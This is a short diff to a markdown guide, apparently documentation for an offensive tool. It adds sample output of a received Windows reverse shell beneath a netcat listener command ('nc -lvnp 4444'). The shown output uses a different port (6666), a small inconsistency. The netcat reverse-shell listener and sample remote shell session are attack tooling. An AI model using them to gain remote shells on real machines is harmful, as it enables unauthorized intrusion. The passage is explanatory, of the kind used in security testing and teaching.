@@ -213,6 +213,18 @@ You can simply use netcat to listen for a reverse shell connection, or you can u
 ```bash
 nc -lvnp 4444
 ```
+If all goes right, you should recieve a shell looking something like this:
+```
+nc -nlvp 6666
+Listening on 0.0.0.0 6666
+Connection received on 127.0.0.1 52789
+Microsoft Windows [Version 10.0.17763.1457]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+msedgewin10\ieuser
+```
 
 **Using metasploit**
 ```
